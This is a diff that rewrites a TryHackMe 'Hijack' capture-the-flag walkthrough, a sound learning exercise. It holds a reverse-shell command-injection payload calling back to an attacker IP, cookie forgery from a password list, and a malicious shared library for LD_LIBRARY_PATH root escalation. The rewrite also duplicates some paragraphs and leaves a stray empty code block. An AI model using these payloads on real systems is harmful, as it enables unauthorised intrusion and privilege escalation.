@@ -1,131 +1,129 @@
-# Hijack
-https://tryhackme.com/room/hijack
+# <div align="center">[Hijack - TryHackMe walkthrough](https://tryhackme.com/room/hijack?utm_source=chatgpt.com)</div>
+<div align="center">Misconfigs conquered, identities claimed.</div>
+<div align="center">
+	<img width="200" height="200" alt="HIJACK" src="https://github.com/user-attachments/assets/951f63c4-eb12-4711-b60c-aabde3ecdbdc" />
+</div>
 
 # Initial Enumeration
 
-scanning the runnng service to know more about it 
-```
+I started with an Nmap scan to identify the running services and get a better understanding of the target surface.
+
+```bash
 nmap -sV -sC 10.49.153.158
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-25 21:10 IST
-Nmap scan report for 10.49.153.158
-Host is up (0.053s latency).
-Not shown: 995 closed tcp ports (conn-refused)
+```
+
+```bash
 PORT     STATE SERVICE VERSION
 21/tcp   open  ftp     vsftpd 3.0.3
 22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
-|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
-|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
 80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-title: Home
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
-|_      httponly flag not set
-|_http-server-header: Apache/2.4.18 (Ubuntu)
 111/tcp  open  rpcbind 2-4 (RPC #100000)
-| rpcinfo: 
-|   program version    port/proto  service
-|   100000  2,3,4        111/tcp   rpcbind
-|   100000  2,3,4        111/udp   rpcbind
-|   100000  3,4          111/tcp6  rpcbind
-|   100000  3,4          111/udp6  rpcbind
-|   100003  2,3,4       2049/tcp   nfs
-|   100003  2,3,4       2049/tcp6  nfs
-|   100003  2,3,4       2049/udp   nfs
-|   100003  2,3,4       2049/udp6  nfs
-|   100005  1,2,3      43133/udp6  mountd
-|   100005  1,2,3      46890/tcp6  mountd
-|   100005  1,2,3      54493/udp   mountd
-|   100005  1,2,3      59154/tcp   mountd
-|   100021  1,3,4      35344/tcp6  nlockmgr
-|   100021  1,3,4      40813/tcp   nlockmgr
-|   100021  1,3,4      40830/udp   nlockmgr
-|   100021  1,3,4      58349/udp6  nlockmgr
-|   100227  2,3         2049/tcp   nfs_acl
-|   100227  2,3         2049/tcp6  nfs_acl
-|   100227  2,3         2049/udp   nfs_acl
-|_  100227  2,3         2049/udp6  nfs_acl
 2049/tcp open  nfs     2-4 (RPC #100003)
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-there are some port thta re open
-* 21 ftp
-* ssh on port 22
-* port 80 http
-* 111
-* nfs 2049
 
-There are three services are really interesting for the initial lookup. I first checked the ftp and I thought maybe it allows the anonymous login but it failed. Then look into the nfs. Use showmount -e to show any exist directory names.
+The scan revealed a few interesting services:
+
+* FTP on port 21
+* SSH on port 22
+* HTTP on port 80
+* RPCBind on port 111
+* NFS on port 2049
+
+The NFS service immediately caught my attention. Before digging into that, I checked whether the FTP server allowed anonymous authentication, but the login attempt failed.
+
+I then used `showmount` to enumerate exported NFS shares.
+
+```bash
+showmount -e 10.49.153.158
 ```
-death@esther:~$ showmount -e 10.49.153.158
+
+```bash
 Export list for 10.49.153.158:
 /mnt/share *
-death@esther:~$
 ```
-/mnt/share can be mounted onto the local machine
 
+The `/mnt/share` directory was exposed and accessible remotely, so I mounted it locally.
 
+```bash
+mkdir hijack_ctf
+sudo mount -t nfs 10.49.153.158:/mnt/share/ hijack_ctf
 ```
-death@esther:/opt/thm$ mkdir hijack_ctf
-death@esther:/opt/thm$ sudo mount -t nfs 10.49.153.158:/mnt/share/ hijack_ctf
-[sudo] password for death: 
+
+```bash
 death@esther:/opt/thm$ ls -la
 total 12
 drwxr-xr-x 3 death death 4096 May 25 21:28 .
 drwxr-xr-x 6 root  root  4096 May 25 21:28 ..
 drwx------ 2  1003  1003 4096 Aug  9  2023 hijack_ctf
 ```
-NFS lacks authentication and authorization. By creating a local user with UID/GID 1003, we effectively impersonated the NFS share’s owner and gained their permissions.
 
+The mounted directory was owned by UID and GID `1003`. Since NFS relies heavily on UID/GID mapping, I created a local user with the same identifiers to inherit the share permissions.
 
-We created a user with the UID 1003 and GID 1003 on our local system to mimic the share’s owner.
-```
+```bash
 sudo useradd hijack
 sudo usermod -u 1003 hijack
 sudo groupmod -g 1003 hijack
 sudo passwd hijack
 ```
-Having logged in as the new user, we will try accessing the mounted share.
-```
+
+After creating the user, I switched into it and accessed the mounted share.
+
+```bash
 su hijack
 ```
-Within the mounted share, we found a text file that contained credentials for an FTP server.
-```
-death@esther:/opt/thm$ su hijack 
-Password: 
+
+Inside the share, I found a text file containing FTP credentials.
+
+```bash
 $ ls
 hijack_ctf
+
 $ cd hijack_ctf
+
 $ ls
 for_employees.txt
+
 $ cat for_employees.txt
 ftp creds :
 
 ftpuser:W3stV1rg1n14M0un741nM4m4
 ```
-Let login to ftp
+
+# Credential Discovery
+
+Using the credentials discovered from the NFS share, I logged into the FTP service.
+
+```bash id="4jv7ep"
+ftp 10.49.153.158
 ```
-death@esther:~$ ftp 10.49.153.158
+
+```bash id="9pnfho"
 Connected to 10.49.153.158.
 220 (vsFTPd 3.0.3)
 Name (10.49.153.158:death): ftpuser
 331 Please specify the password.
-Password: 
+Password: W3stV1rg1n14M0un741nM4m4
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
 ```
-Listing directory got a hidden file
-```
+
+After logging in successfully, I started enumerating the available files inside the FTP directory. A normal listing did not reveal anything interesting, so I switched to a detailed listing to check for hidden files.
+
+```bash id="2t9x6m"
 ftp> ls
+
 229 Entering Extended Passive Mode (|||30802|)
 150 Here comes the directory listing.
 226 Directory send OK.
+```
+
+```bash id="1v6qfd"
 ftp> ls -la
+
 229 Entering Extended Passive Mode (|||35347|)
 150 Here comes the directory listing.
+
 drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 .
 drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 ..
 -rwxr-xr-x    1 1002     1002          220 Aug 08  2023 .bash_logout
@@ -133,62 +131,86 @@ drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 ..
 -rw-r--r--    1 1002     1002          368 Aug 08  2023 .from_admin.txt
 -rw-r--r--    1 1002     1002         3150 Aug 08  2023 .passwords_list.txt
 -rwxr-xr-x    1 1002     1002          655 Aug 08  2023 .profile
+
 226 Directory send OK.
+```
+
+Among the hidden files, `.passwords_list.txt` immediately caught my attention. I downloaded it locally for further inspection.
+
+```bash id="31to3g"
 ftp> get .passwords_list.txt
+```
+
+```bash id="6u0lb2"
 local: .passwords_list.txt remote: .passwords_list.txt
 229 Entering Extended Passive Mode (|||39466|)
 150 Opening BINARY mode data connection for .passwords_list.txt (3150 bytes).
+
 100% |***********************************|  3150       30.21 KiB/s    00:00 ETA
+
 226 Transfer complete.
 3150 bytes received in 00:00 (24.16 KiB/s)
+
 ftp> exit
 221 Goodbye.
-death@esther:~$ 
 ```
 
-maybe ther are passwords 
+The file contained multiple passwords, which looked potentially useful for further enumeration and authentication attempts.
+
 <img width="401" height="199" alt="image" src="https://github.com/user-attachments/assets/fee27f94-abb8-49a9-996d-1285742e9a0c" />
 
+## Web Enumeration
 
-Let move to web
+After collecting the FTP password list, I moved toward the web application running on port 80.
+
+The homepage looked fairly simple at first glance.
 
 <img width="717" height="201" alt="image" src="https://github.com/user-attachments/assets/eaa5bc0c-8b49-450d-ad2e-f6edc2b1f111" />
 
-Let sign up and login 
+I created a normal account and logged into the application.
+
 <img width="393" height="171" alt="image" src="https://github.com/user-attachments/assets/8028bf1d-957c-4b70-af1f-f0125ef2dc18" />
 
-after login we can see the same but there is an admin tab here 
-as i click on it its says 
+After authentication, the dashboard looked mostly the same, but this time an additional Admin tab appeared in the navigation bar. When I clicked on it, the application returned an access denied message.
 
 <img width="696" height="121" alt="image" src="https://github.com/user-attachments/assets/f0fab9a3-b7ed-4899-ad03-e0dacb1e245a" />
-crazy let get the req if we can switch directly from normal user to admin i open my burp and capture the request
+
+That immediately made me curious about how the application handled authorization. I opened Burp Suite and intercepted the request while accessing the admin panel.
 
 <img width="828" height="801" alt="image" src="https://github.com/user-attachments/assets/0e169787-61a0-464e-8810-31801ddc4018" />
 
-as i capture the reuqest i suspected the cookei pattern
+While reviewing the captured request, the session cookie looked unusual.
 ```
 Cookie: PHPSESSID=VGVzdDowZTc1MTcxNDFmYjUzZjIxZWU0MzliMzU1YjVhMWQwYQ%3D%3D
 ```
-as i use cyberchef to identify it 
+
+The structure looked encoded rather than randomly generated, so I copied the value into [CyberChef](https://cyberchef.org) for analysis.
 
 <img width="1127" height="610" alt="image" src="https://github.com/user-attachments/assets/eb8a823f-e53b-431e-b7e9-2697aab659f5" />
 
-its look a like the username:hash_of_password
-let see which hash is this one
+After decoding it, the format looked like:
+```
+username:hash
+```
+The hash portion also looked familiar, so I identified it separately.
+
+The hash turned out to be MD5.
 
 <img width="880" height="490" alt="image" src="https://github.com/user-attachments/assets/f02e6d47-7f34-43db-a6e7-5fa9f22370d1" />
 
-ok so this one is md5 
-So the PHPSESSIDD is base64encoded(username:md5hash(password))
-Given the fact that the admin uses a password from the given wordlist a session ID can be constructed and this session ID can be used to session hijack the admin’s account
+At this point, the session format became clear:
+```
+base64(username:md5(password))
+```
+Since I already had a password list from the FTP server, I suspected the admin account might also be using one of those passwords. If I could generate a valid session manually, it might be possible to hijack the admin session without needing to brute force the login form directly.
 
-
-i try to brutefroce it but there is rate limit 
-
+I initially tried testing requests manually, but the application quickly started rate limiting the attempts.
 <img width="1010" height="264" alt="image" src="https://github.com/user-attachments/assets/00e97215-77ad-4b06-9779-8728cd099970" />
 
-i used chatgpt to crate a script of my desiger 
-```
+
+
+To avoid interacting with the login form repeatedly, I created a Python script that generated valid session cookies using passwords from the discovered wordlist.
+```c
 import hashlib
 import base64
 import requests
@@ -239,6 +261,34 @@ for password in passwords:
     except requests.exceptions.RequestException as e:
         print(f"[-] Error: {e}")
 ```
+I saved the script locally.
+```
+nano bruteforce.py
+```
+Then I executed it against the target.
+```
+python3 bruteforce.py
+[+] Enter Target IP: 10.49.153.158
+[+] Enter Wordlist Path: .passwords_list.txt
+
+[+] Loaded 150 passwords
+[+] Target: http://10.49.153.158/administration.php
+```
+The script started generating session cookies using each password from the wordlist and tested them directly against the admin endpoint.
+
+After a few attempts, a valid session was finally discovered.
+
+```
+[+] Valid Session Found
+[+] Password : uDh3jCQsdcuLhjVkAy5x
+[+] Cookie   : PHPSESSID=YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU=
+```
+Using the generated cookie, I was able to access the admin panel successfully.
+
+
+i used chatgpt to crate a script of my desiger 
+```
+```
 save the script 
 ```
 nano bruteforce.py
@@ -266,53 +316,64 @@ death@esther:~$
 ```
 <img width="784" height="179" alt="image" src="https://github.com/user-attachments/assets/10aa672c-458d-4b26-bd5e-b608b02bb804" />
 
-let use this cookei to access admin pannel
-let click on administration tab and captrue request
+
+## Initial Access
+
+With the valid admin session cookie generated earlier, I went back to the application and intercepted the request to the administration panel using Burp Suite.
+
 <img width="754" height="784" alt="image" src="https://github.com/user-attachments/assets/9ca1eb76-451c-4ad1-8597-3635fd333d49" />
 
-Let replace this old cookei with our new 
+I replaced the existing PHPSESSID value with the newly generated admin cookie.
 
 <img width="1429" height="451" alt="image" src="https://github.com/user-attachments/assets/da352ba1-08ec-4e1a-9f0f-d3a0e79df363" />
 
-as i replace it got admin pannel 
+After forwarding the modified request, the admin panel loaded successfully.
 
-It is a online service checker, if you enter any services, it will show the status of the service.
+The page turned out to be an online service status checker. It accepted a service name as input and returned the current status of the requested service.
 
-as i check for service ssh it show me status 
+To understand how the feature behaved, I tested it using `ssh`.
 
 <img width="1191" height="498" alt="image" src="https://github.com/user-attachments/assets/0fae9e75-f86e-44fb-aae8-1aea510089d1" />
+The application returned the service status correctly. While testing the functionality, I noticed that every request required the admin session cookie, so I kept replacing the cookie value inside Burp before forwarding requests.
 
-make sure during sending req each time repaly ur cookei with admin cookei 
+After spending some time interacting with the feature, I realized the input might be vulnerable to command injection. The backend appeared to execute shell commands directly using the provided service name.
 
-after understand the way of working i got know to buypass this with `&&` operator
+I tested command chaining using the && operator and attempted to execute a reverse shell.
 
-let try to share a rev shell
+The application returned the service status correctly. While testing the functionality, I noticed that every request required the admin session cookie, so I kept replacing the cookie value inside Burp before forwarding requests.
 
+After spending some time interacting with the feature, I realized the input might be vulnerable to command injection. The backend appeared to execute shell commands directly using the provided service name.
+
+I tested command chaining using the && operator and attempted to execute a reverse shell.
 ```
 ssh && bash -c "bash -i >& /dev/tcp/<IP>/1234 0>&1"
 ```
-open netcat in your terminal first 
+Before sending the payload, I started a Netcat listener on my local machine.
 ```
 nc -lnvp 1234
 ```
-add ur vpn ip to pyload 
-Let upload it 
+I replaced `<IP>` with my VPN IP address and submitted the payload through the service checker.
 
 <img width="1275" height="510" alt="image" src="https://github.com/user-attachments/assets/ce00c706-8a2c-4d56-b0fe-06ebc58913a2" />
 
-Wow we got the rev shell
+A few seconds later, the reverse shell connected back successfully.
+
+A few seconds later, the reverse shell connected back successfully.
+
 ```
-death@esther:~$ nc -lnvp 1234
 Listening on 0.0.0.0 1234
 Connection received on 10.49.153.158 47886
+
 bash: cannot set terminal process group (1244): Inappropriate ioctl for device
 bash: no job control in this shell
-www-data@Hijack:/var/www/html$ 
+
+www-data@Hijack:/var/www/html$
 ```
-we got config file here 
+Now operating as `www-data`, I started enumerating the web directory.
 ```
-www-data@Hijack:/var/www/html$ ls
 ls
+```
+```
 administration.php
 config.php
 index.php
@@ -322,40 +383,63 @@ navbar.php
 service_status.sh
 signup.php
 style.css
-www-data@Hijack:/var/www/html$
 ```
-let take a look and find creds
+The config.php file looked interesting, so I inspected it for credentials.
 
-<img width="733" height="372" alt="image" src="https://github.com/user-attachments/assets/3a148004-9146-44cc-a543-58ee05b61367" />
+
+Inside the file, I found database credentials stored in plaintext.
 ```
 $servername = "localhost";
 $username = "rick";
 $password = "N3v3rG0nn4G1v3Y0uUp";
 $dbname = "hijack";
 ```
-we got user:pass and db name
-let try to elevate our privilage using ssh
-```
+
+<img width="733" height="372" alt="image" src="https://github.com/user-attachments/assets/3a148004-9146-44cc-a543-58ee05b61367" />
+
+# Lateral Movement
+
+After finding the credentials inside `config.php`, I decided to test whether the same credentials were reused for SSH access.
+
+```bash id="r4n8tp"
 ssh rick@10.49.153.158
+```
+
+```text id="m2v7ka"
 password: N3v3rG0nn4G1v3Y0uUp
 ```
-we r inside 
-```
+
+The credentials worked successfully, and I gained an interactive shell as the `rick` user.
+
+```bash id="u5q1zs"
 $ ls
+```
+
+```text id="c8n6fd"
 user.txt
 ```
 
-capturing User flag
+I immediately checked the user flag.
+
+```bash id="x7v3oq"
+cat user.txt
 ```
-$ cat user.txt
+
+```text id="n9t4wb"
 THM{fdc8cd4cff2c19e0d1022e78481ddf36}
 ```
 
-## Priv esc 
-as i check for 
+# Privilege Escalation Enumeration
+
+After getting access as the `rick` user, I started checking for possible privilege escalation vectors.
+
+The first thing I checked was the user's sudo permissions.
+
+```bash id="d2k9qa"
+sudo -l
 ```
-$ sudo -l
-[sudo] password for rick: 
+
+```text id="m7v1cf"
 Matching Defaults entries for rick on Hijack:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
@@ -363,66 +447,77 @@ Matching Defaults entries for rick on Hijack:
 
 User rick may run the following commands on Hijack:
     (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
-$ 
 ```
 
-From this sudo permission, we can see the sudo have a special environment variable called env_keep and its value is equals to LD_LIBRARY_PATH. Here is method for you to use it for privilege escalation.
-The prompt is asking for a more precise English translation of a statement about the LD_LIBRARY_PATH environment variable and its relation to finding shared libraries for Apache.
-```
+The interesting part here was the `env_keep+=LD_LIBRARY_PATH` setting.
+
+Since the `LD_LIBRARY_PATH` environment variable was preserved during sudo execution, it opened the door for shared library hijacking. The idea was to force the target binary to load a malicious shared library from a custom path before loading the legitimate one.
+
+To understand which shared libraries the Apache binary used, I checked them using `ldd`.
+
+```bash id="x5n8re"
 ldd /usr/sbin/apache2
 ```
 
+```text id="z3t0wl"
+linux-vdso.so.1 =>  (0x00007fff5ab16000)
+libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3
+libaprutil-1.so.0 => /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0
+libapr-1.so.0 => /usr/lib/x86_64-linux-gnu/libapr-1.so.0
+libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
+libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1
 ```
-$ ldd /usr/sbin/apache2
-	linux-vdso.so.1 =>  (0x00007fff5ab16000)
-	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f8885012000)
-	libaprutil-1.so.0 => /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0 (0x00007f8884deb000)
-	libapr-1.so.0 => /usr/lib/x86_64-linux-gnu/libapr-1.so.0 (0x00007f8884bb9000)
-	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f888499c000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f88845d2000)
-	libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007f888439a000)
-	libexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007f8884171000)
-	libuuid.so.1 => /lib/x86_64-linux-gnu/libuuid.so.1 (0x00007f8883f6c000)
-	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f8883d68000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007f8885527000)
-$ 
-```
-We’ll create a malicious C program (malware.c) in /tmp to exploit the libcrypt.so.1 library
 
-The LD_LIBRARY_PATH contains a list of directories which search for shared libraries first
-Using ldd /usr/sbin/apache2. To print the shared libraries of the apache2 program,
-Use one of the shared objects in the list and we will hijack it by creating a file with the same name. For this demonstration, we will target the libcrypt.so.1 file
-Creating a shared library-
-```
+I decided to target `libcrypt.so.1`.
+
+The plan was to create a malicious shared object with the same name and place it inside `/tmp`. Then, by setting `LD_LIBRARY_PATH=/tmp`, Apache would load my malicious library first.
+
+I created the following C file.
+
+```bash id="f1u7nc"
 nano library_path.c
 ```
-past this 
-```
+
+```c id="q8v4ke"
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+
 static void hijack() __attribute__((constructor));
+
 void hijack() {
         unsetenv("LD_LIBRARY_PATH");
         setreuid(0,0);
         system("/bin/bash -p");
 }
 ```
-Compiling the C binary-
-```
+
+Next, I compiled it as a shared library named `libcrypt.so.1`.
+
+```bash id="w6p2sj"
 gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/rick/library_path.c
 ```
-Executing the exploit to gain root access-
-```
+
+Once the malicious library was ready, I executed Apache with the modified `LD_LIBRARY_PATH`.
+
+```bash id="y9m5ta"
 sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
 ```
 
+The exploit worked successfully and spawned a root shell.
+
 <img width="1303" height="164" alt="image" src="https://github.com/user-attachments/assets/efb9896e-09d1-4750-98e2-5e58616472ce" />
 
-Capturing the root flag
-```
-root@Hijack:~# cat /root/root.txt 
+# Root Access
 
+Now operating as root, I captured the final flag.
+
+```bash id="u4r8xp"
+cat /root/root.txt
+```
+
+```text id="c2k6nm"
 ██╗░░██╗██╗░░░░░██╗░█████╗░░█████╗░██╗░░██╗
 ██║░░██║██║░░░░░██║██╔══██╗██╔══██╗██║░██╔╝
 ███████║██║░░░░░██║███████║██║░░╚═╝█████═╝░
@@ -431,8 +526,17 @@ root@Hijack:~# cat /root/root.txt
 ╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
 
 THM{b91ea3e8285157eaf173d88d0a73ed5a}
-root@Hijack:~# 
-
 ```
 
+# Conclusion
+
+Hijack was a fun machine focused on misconfigurations, session hijacking, command injection, and privilege escalation through `LD_LIBRARY_PATH` abuse. Every step connected nicely and made the enumeration process feel realistic and practical.
+
 <img width="829" height="385" alt="image" src="https://github.com/user-attachments/assets/b3fb5c0e-6f42-43f6-ba47-8aa01b3cdad4" />
+
+Thanks for reading this walkthrough. I hope it helped you understand the room better.
+
+More walkthroughs:
+
+* [Death Esther Medium](https://deathesther.medium.com?utm_source=chatgpt.com)
+* [TryHackMe Walkthrough Repository](https://github.com/Esther7171/TryHackMe-Walkthroughs?utm_source=chatgpt.com)
